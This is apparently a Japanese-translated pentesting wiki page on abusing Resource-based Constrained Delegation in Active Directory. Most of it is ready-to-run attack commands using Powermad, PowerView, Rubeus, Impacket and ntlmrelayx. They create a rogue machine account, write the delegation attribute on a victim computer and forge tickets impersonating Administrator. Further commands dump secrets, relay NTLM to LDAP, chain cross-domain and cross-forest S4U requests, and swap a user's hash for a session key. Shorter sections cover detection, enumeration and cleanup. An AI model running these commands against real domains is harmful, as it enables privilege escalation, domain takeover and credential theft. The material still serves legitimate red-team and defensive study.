# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegationの基礎

これは基本的な [Constrained Delegation](constrained-delegation.md) と似ていますが、**違いは**、**object** に対して **machineに対する任意のユーザーのimpersonate** 権限を与えるのではなく、Resource-based Constrain Delegationでは、**自身に対して任意のユーザーをimpersonateできるobject** を **設定する** 点です。

この場合、制約対象のobjectには _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ というattributeがあり、そこに、そのobjectに対して他の任意のユーザーをimpersonateできるユーザーの名前が設定されます。

このConstrained Delegationと他のdelegationのもう1つの重要な違いは、**machine accountに対するwrite permissions** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) を持つ任意のユーザーが **_msDS-AllowedToActOnBehalfOfOtherIdentity_** を設定できることです（他の形式のDelegationではdomain admin privsが必要でした）。

### New Concepts

Constrained Delegationでは、ユーザーの _userAccountControl_ value 内にある **`TrustedToAuthForDelegation`** flagが **S4U2Self** の実行に必要だと説明しました。しかし、これは完全には正しくありません。\
実際には、そのvalueがなくても、**service**（SPNを持つ）であれば任意のユーザーに対して **S4U2Self** を実行できます。ただし、**`TrustedToAuthForDelegation`** が **ある** 場合、返されるTGSは **Forwardable** になり、そのflagが **ない** 場合、返されるTGSは **Forwardable** にはなりません。

ただし、**S4U2Proxy** で使用する **TGS** が **NOT Forwardable** の場合、**basic Constrain Delegation** を悪用しようとしても機能しません。しかし、Resource-Based constrain delegationをexploitしようとしている場合は機能します。

### Attack structure

> **Computer** accountに対する **write equivalent privileges** がある場合、そのmachineへの **privileged access** を取得できます。

攻撃者がすでに**被害者のcomputerに対するwrite equivalent privileges**を持っているとします。

1. 攻撃者は **SPN** を持つaccountを **compromise** するか、1つ作成します（「Service A」）。なお、特別な権限を持たない任意の _Admin User_ は、最大10個のComputer object（**_MachineAccountQuota_**）を**作成**し、それらに **SPN** を設定できます。そのため攻撃者は、Computer objectを作成してSPNを設定するだけで済みます。
2. 攻撃者は被害者computer（ServiceB）に対するWRITE privilegeを**悪用**し、ServiceAがその被害者computer（ServiceB）に対して任意のユーザーをimpersonateできるように **resource-based constrained delegation** を設定します。
3. 攻撃者はRubeusを使用し、Service AからService Bに対して、**Service Bへのprivileged access**を持つユーザーとして **full S4U attack**（S4U2SelfおよびS4U2Proxy）を実行します。
1. S4U2Self（SPNをcompromise/作成したaccountから）：**Administratorから自分へのTGS** を要求します（Not Forwardable）。
2. S4U2Proxy：前の手順で取得した **not Forwardable TGS** を使用し、**Administrator** から **victim host** への **TGS** を要求します。
3. not Forwardable TGSを使用している場合でも、Resource-based constrained delegationをexploitしているため機能します。
4. 攻撃者は **pass-the-ticket** を実行し、そのユーザーを **impersonate** して被害者のServiceBへの **access** を取得できます。

domainの _**MachineAccountQuota**_ を確認するには、次を使用できます：
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピューターオブジェクトの作成

**[powermad](https://github.com/Kevin-Robertson/Powermad)** を使用して、ドメイン内にコンピューターオブジェクトを作成できます。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation の設定

**activedirectory PowerShell module を使用**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**PowerView の使用**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全な S4U attack の実行（Windows/Rubeus）

まず、パスワード `123456` を使用して新しい Computer オブジェクトを作成したため、そのパスワードの hash が必要です：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これは、そのアカウントの RC4 および AES ハッシュを出力します。\
これで、攻撃を実行できます：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus の `/altservice` パラメータを使って一度リクエストするだけで、複数のサービス向けにさらに多くの ticket を生成できます。
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ユーザーには "**Cannot be delegated**" という属性があることに注意してください。ユーザーのこの属性が True に設定されている場合、そのユーザーになりすますことはできません。このプロパティは BloodHound 内で確認できます。

### Linux tooling: Impacketを用いたエンドツーエンドのRBCD (2024+)

Linuxから操作する場合、公式の Impacket tools を使用してRBCDチェーン全体を実行できます。
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用します。
- AES keys を優先してください。多くの modern domain では RC4 が制限されています。Impacket と Rubeus はどちらも AES-only flows をサポートしています。
- Impacket は一部の tools で `sname`（"AnySPN"）を書き換えられますが、可能な限り正しい SPN を取得してください（例：CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

## Cross-domain & cross-forest RBCD

**delegating principal** を制御しており、それが **resource computer** とは**異なる domain**（または**異なる forest**）に存在する場合でも、abuse は依然として **RBCD** です。ただし、ticket flow は通常の単一 domain における `S4U2Self -> S4U2Proxy` とは異なります。

### Cross-domain RBCD: configure the foreign principal by SID

**異なる domain** から `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定する場合、foreign machine/user は target domain LDAP で **name によって解決できない**ことがあります。その場合は、foreign principal の sAMAccountName/UPN ではなく、その principal の **SID** を使用して delegation entry を設定します。

これは、`ntlmrelayx.py` で NTLM を LDAP に relay する場合に特に重要です：
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` は `ntlmrelayx.py` に対し、`--escalate-user` を SID として扱うよう指示します。これは、delegating account が target domain の外部にある場合に必要です。
- ツールが `User not found in LDAP` と出力した場合でも、security descriptor が外部 SID を直接格納するため、delegation の書き込みは成功する可能性があります。

### Cross-domain RBCD: cross-realm S4U sequence

foreign principal が `msDS-AllowedToActOnBehalfOfOtherIdentity` に追加されると、動作する cross-domain フローは次のようになります。

1. delegating principal の own domain から、その principal の **TGT** を取得する。
2. `krbtgt/<target-domain>` の **referral TGT** を要求する。
3. target-domain DC 上で、偽装するユーザーの **cross-realm S4U2Self referral** を要求する。
4. delegator domain に戻り、そのユーザーの実際の **S4U2Self** ticket を要求する。
5. delegator domain で **S4U2Proxy** を実行し、target domain 用の referral ticket を取得する。
6. target-domain DC で最終的な **S4U2Proxy** を実行し、`cifs/host.target`、`host/host.target` などの service ticket を取得する。

これが、stock Linux tooling が cross-domain RBCD で失敗することが多い理由です。

- request の **realm** は、`TGS-REQ` で使用する TGT の realm と異なる必要がある場合がある
- この chain には、単一の `S4U2Self` や `S4U2Self` 直後の単一の `S4U2Proxy` だけでなく、**独立した S4U2Proxy steps** が必要になる

### Cross-domain RBCD from Linux

Synacktiv は、2 つの KDC を明示的に処理することで、Linux から cross-realm sequence を再現する Impacket `getST.py` implementation を公開しました。
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
運用上、新しい引数は以下のとおりです:
- `-dc-ip`: **delegating** domain の DC
- `-targetdomain`: **resource computer** の domain
- `-targetdc`: **resource** domain の DC

### Cross-forest RBCD の制限

Cross-forest RBCD には重要な制限があります: **impersonated user は delegating principal と同じ forest に所属している必要があります**。つまり、管理下の machine account が `valhalla.local` にあり、target resource が `asgard.local` にある場合、通常は RBCD 経由で任意の **asgard.local** user をその resource に対して impersonate **できません**。

以下の場合は引き続き exploit 可能です:
- **delegating forest** の user が、他方の forest の resource host に対する **local admin**（またはその他の privileged user）である
- trust により必要な authentication path が許可され、foreign SID が target computer の security descriptor で受け入れられる

### Cross-forest RBCD の protocol quirks

Cross-forest RBCD は、単なる「cross-domain と trust の組み合わせ」ではありません。確認された flow には、一般的な tooling が歴史的に見落としている2つの quirks があります:

1. `PA-PAC-OPTIONS=branch-aware` を設定する追加の **S4U2Proxy** request
2. 他の etype が要求されている場合でも、最終的な service ticket が **RC4** を使用して返される場合がある

実際の flow は以下のとおりです:

1. forest A の delegating principal の TGT を取得する。
2. forest A で impersonated user に対する **S4U2Self** を request する。
3. forest A で **S4U2Proxy** を request し、forest B 用の referral TGT を取得する。
4. forest A で、**S4U2Self** ticket を additional ticket として指定せず、`branch-aware` を有効にして2回目の **S4U2Proxy** を送信し、forest B 用の別の referral TGT を取得する。
5. 必要に応じて、forest B で delegating principal 用の通常の service ticket を request する（この ticket は最終的な abuse には不要）。
6. 手順3と4の referral ticket を使用し、forest B で、impersonated forest-A user から target SPN への最終的な **S4U2Proxy** ticket を request する。

### Linux からの Cross-forest RBCD

同じ Synacktiv の Impacket branch では、この logic 用に `-forest` switch が追加されています:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD（3+ domains）

**multi-domain forests** では、**S4U2Self** と **S4U2Proxy** は、1 回の referral の後に停止せず、**recursive** に実行できます。

- **Recursive S4U2Self**: 最初の `S4U2Self` は **impersonated user's domain** に送信され、中間の parent/child hop は `krbtgt/<REALM>` に対する通常の `TGS-REQ` referral によって通過し、**final `S4U2Self`** は **delegating principal's own domain** に送信されます。
- つまり、マシンアカウントの **TGT** を保持しているだけで、同じ forest 内の別の domain の **admin** になりすまし、`cifs/host`、`host/host`、`wsman/host` などを要求できる場合があります。
- **Recursive S4U2Proxy** も同様に trust chain をたどります。中間の hop では、次の `krbtgt/<REALM>` referral を要求する際に前の ticket を TGT として再利用し、最後の hop のみが最終的な service ticket を返します。

実用的な同一 forest の例は次のとおりです。
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

**委任元 principal が SPN を持たないユーザーの場合**、最後の再帰的な `S4U2Self` は **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** で失敗します。回避策は、**最後の hop のみを `S4U2Self+U2U` として再試行する**ことです。

悪用チェーンの短縮版:

1. **NT hash** で認証し、KDC が **RC4-HMAC (etype 23)** を選択するよう誘導する。
2. 最初に **`-self -u2u`** をリクエストし、その ticket を後の proxy step 用の ticket とは分けて保持する。
3. `describeTicket.py` で **TGT session key** を抽出する。
4. `changepasswd.py -newhashes <session_key>` を使用して、ユーザーの **NT hash** をその **session key** に置き換える。
5. 別の **`-proxy`** リクエストで、`S4U2Self+U2U` ticket を **`-additional-ticket`** として再利用する。
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
運用上の注意点:

- **最初の信頼ホップがすでに別の forest である場合**は、ネイティブの Windows の動作に合わせるため、**branch-aware** アルゴリズム（`getST.py ... -forest`）を優先してください。チェーンの**後段で初めて foreign forest に到達する場合**は、branch-aware ではない再帰フローでも動作する可能性があります。
- 最近の **Windows Server 2022/2025** の DC では、RC4 の非推奨化により、強制した RC4 が **`KDC_ERR_ETYPE_NOSUPP`** で失敗することがあります。このため、classic SPN-backed RBCD は AES で引き続き動作する場合でも、**SPN-less RBCD が不可能**になる可能性があります。
- ユーザーの hash/password を変更する前に **`S4U2Self+U2U`** を実行してください。`SamrChangePasswordUser` はアカウントの Kerberos AES keys を再計算しないため、先に password を変更すると、その後の ticket requests が失敗する可能性があります。
- impersonate されるアカウントは、引き続き **delegable** でなければなりません。**Protected Users** および **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** が設定されたアカウントは、このチェーンをブロックします。

## Detection / hardening notes

- ドメイン/forest をまたぐ RBCD パスは、通常、依然として **ACL abuse** または **relay-to-LDAP** によって作成されます。一般的な setup paths を阻止するため、DC で **LDAP signing** と **LDAP channel binding** を強制してください。
- コンピューター オブジェクト上の `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き込み可能なユーザーを監査し、保存された SID を解決してください。**foreign security principals** も対象に含めます。
- trust が多い環境では、**Selective Authentication**、**SID filtering**、および foreign forest のユーザーが resource hosts 上で **local admin** 権限を持っているかどうかを確認してください。

### Accessing

最後のコマンド ラインは、**完全な S4U attack を実行し、Administrator から victim host への TGS をメモリ内に inject します**。\
この例では Administrator から **CIFS** service 用の TGS を要求しているため、**C$** にアクセスできます:
```bash
ls \\victim.domain.local\C$
```
### 異なる service tickets の悪用

[**利用可能な service tickets はこちら**](silver-ticket.md#available-services)で確認できます。

## 列挙、監査、クリーンアップ

### RBCD が設定されたコンピューターを列挙

PowerShell（SD をデコードして SID を解決）：
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket（1つのコマンドで読み取りまたはフラッシュ）：
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD のクリーンアップ / リセット

- PowerShell（属性をクリア）:
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: これは Kerberos が DES または RC4 を使用しないように設定されており、RC4 hash だけを提供していることを意味します。Rubeus に少なくとも AES256 hash を提供してください（または rc4、aes128、aes256 hash をすべて提供してください）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** が通常の user に対する `-self` 中に発生する場合: 委任元 principal に **SPN がない** 可能性があります。通常の **S4U2Self** の代わりに **`S4U2Self+U2U`** として **last hop** を再試行してください。
- **SPN-less RBCD** 中の **`KDC_ERR_ETYPE_NOSUPP`**: 最近の DC は、`S4U2Self+U2U` と session-key-substitution trick に必要な強制 **RC4-HMAC** path を拒否する場合があります。代わりに AES を使用する classic **SPN-backed** RBCD path を試してください。
- **`KRB_AP_ERR_SKEW`**: これは現在の computer の時刻が DC の時刻と異なり、Kerberos が正常に動作していないことを意味します。
- **`preauth_failed`**: これは、指定した username + hashes では login できないことを意味します。hashes の生成時に username 内の "$" を入れ忘れている可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: これは以下を意味している可能性があります:
- impersonate しようとしている user が目的の service にアクセスできない（impersonate できない、または十分な privileges がないため）
- 要求した service が存在しない（winrm の ticket を要求したが、winrm が実行されていない場合）
- 作成した fakecomputer が vulnerable server に対する privileges を失っており、再付与する必要がある。
- classic KCD を abuse しています。RBCD は non-forwardable S4U2Self tickets で動作しますが、KCD には forwardable が必要です。

## Notes、relays、alternatives

- LDAP が filtered の場合、AD Web Services（ADWS）経由で RBCD SD を書き込むこともできます。参照:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains は、1 step で local SYSTEM を取得するために RBCD で終了することがよくあります。実践的な end-to-end examples:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding が **disabled** で、machine account を作成できる場合、**KrbRelayUp** などの tools は、強制した Kerberos auth を LDAP に relay し、target computer object 上で自身の machine account に対して `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定し、off-host から S4U 経由ですぐに **Administrator** を impersonate できます。

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
